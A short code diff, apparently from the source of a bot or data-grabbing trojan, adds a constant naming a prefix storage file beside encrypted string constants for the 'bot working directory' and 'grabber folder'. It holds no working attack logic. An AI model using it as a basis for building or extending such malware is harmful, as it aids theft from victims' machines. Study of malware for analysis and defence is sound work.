@@ -49,6 +49,8 @@ CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
 CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
 CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
+// Имена служебных фалов
+CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 
 
 
